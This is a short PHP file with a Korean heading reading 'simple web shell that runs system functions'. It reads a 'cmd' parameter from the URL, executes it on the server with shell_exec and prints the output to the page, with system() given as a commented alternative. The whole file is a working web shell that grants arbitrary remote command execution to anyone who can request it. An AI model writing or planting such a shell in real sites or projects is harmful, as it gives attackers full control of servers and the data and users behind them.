# 간단한 시스템 함수 실행 웹쉘
<?
    $cmd = $_GET["cmd"];
    $result = shell_exec($cmd);    # 실행을 한 값을 문자열로 반환
    $result = str_replace("\n",'<br>', $result);
    echo $result;
    # system($cmd);   # 바로 실행 후 출력
?>